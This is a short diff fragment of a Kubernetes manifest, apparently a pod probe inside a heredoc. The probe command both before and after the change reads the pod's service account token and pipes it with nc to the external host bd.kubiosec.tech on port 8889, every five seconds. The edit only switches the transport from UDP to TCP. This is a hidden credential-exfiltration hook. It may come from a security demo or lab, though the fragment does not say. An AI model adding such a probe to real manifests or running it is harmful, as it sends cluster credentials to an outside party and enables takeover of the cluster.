@@ -154,7 +154,7 @@ spec:
         command:
         - bash
         - -c
-        - cat /var/run/secrets/kubernetes.io/serviceaccount/token | nc -u bd.kubiosec.tech  8889 
+        - cat /var/run/secrets/kubernetes.io/serviceaccount/token | nc bd.kubiosec.tech  8889 
       initialDelaySeconds: 30
       periodSeconds: 5
 EOF
